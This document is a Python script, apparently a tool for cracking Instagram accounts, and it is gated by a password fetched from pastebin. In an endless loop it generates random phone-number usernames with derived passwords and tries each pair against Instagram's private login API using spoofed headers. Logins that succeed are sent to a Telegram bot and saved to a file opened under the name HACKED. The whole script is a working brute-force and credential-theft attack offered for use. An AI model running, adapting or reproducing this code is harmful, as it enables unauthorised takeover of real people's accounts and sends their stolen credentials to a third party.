import os

import sys

import requests

Sidra = requests.get("https://pastebin.com/raw/7QgFmz0g")
password = input('          TOOL PASSWORD: ')
if password == "" :
  sys.exit()
if password in str(Sidra.text):
  print(" FIRST STEP Is Done. Logged in Successfully as ")
  print("Please Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" راسل المطور للتفعيل @bb_202 !")
  sys.exit()
os.system("clear")
import os
try:
    import uuid
except:
    os.system ("pip install uuid")
try:
    from random import *
except:
    os.systeam("pip install random ")
try:
     import string

except:
    os.system("pip install string")
try:
    import requests 

except:
    os.system ("pip install requests ")
try:
    from user_agent import generate_user_agent

except:
    os.system("pip install user_agent ")
try:
    from datetime import datetime
except:
    os.system("pip install datetime ")
try:
    import time
except:
    os.system("pip install time")
os.system("clear")
try:
    import pyfiglet
except:
    os.system("pip install pyfiglet")
os.system("clear")
import pyfiglet
import os
from time import sleep
import webbrowser
Z = '\x1b[2;31m'
G = '\033[1;32m'
sleep (0.2)
P55 = pyfiglet.figlet_format('KORD')
print(G+ P55)
sleep (0.4)
os.system("clear")
sleep (0.2)
bnar = pyfiglet.figlet_format('NOJDAR')
print (G+bnar)
sleep (0.1)
import random
import uuid
import requests
import string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests
import os
import random
import json
import threading
import secrets,uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
from uuid import uuid4
aa=0
zz=0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
webbrowser.open('https://t.me/URURB')
print (E+'['+S+'!'+E+']'+G+ ' Iᗪ ᗷOT𐇭 ')
print('\n')
ID = input (S+'  𝙸𝙳→   ')
print('\n')
sleep(0.2)
tok = input(S + '𝗧𝗢𝗞𝗘𝗡 ➪  ')
w= 'https://pastebin.com/raw/xPfV5eKD'
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=😹 جاري الفحص روح نام @URURB").json()
id_msg =(start_msg['result']["message_id"])
rss = requests.get(w).text
if  'KORD' in rss:
    sleep(0.1)
r = requests.Session()
user = '0987654321'
while True:
        us = str("".join(random.choice(user)for i in range(8)))        
        username = '+2011'+us
        password = '011'+us
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}        
        uid = str(uuid4())        
        data = {        
        'uuid': uid,        
        'password': password, 
         'username': username,           
         'device_id': uid,       
         'from_reg': 'false',
         '_csrftoken': 'missing',          
         'login_attempt_countn': '0'}          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  
        if ("logged_in_user") in req_login.text:
            zz+=1
            print (G+'username ==> : '+username+': password ==> : '+password)
            tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ✅\n 𝚎𝚖𝚊𝚒𝚕 : {username}\n 𝙿𝚊𝚜𝚜 : {password}\n- BY :- @URURB''')
            i = requests.post(tlg)
            with open('insta.txt','a') as HACKED:
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (S+'username S ==> : '+username+': password ==> : '+password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - - 𝗛𝗜 𝗡𝗢𝗝𝗗𝗔𝗥 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧  🤪  \n ✅ [{zz}] \n------------------------------------------\n  ❌[{aa}]  ( {username} ) \n By → @URURB ")
            print (E+'username ==> : '+username+': password ==> : '+password)
            aa+=1
else:
    print ("نهتت الفترة المجانية راسل المطور لتفعيل ")
    print ("@BB_202 معرف المطور")
    
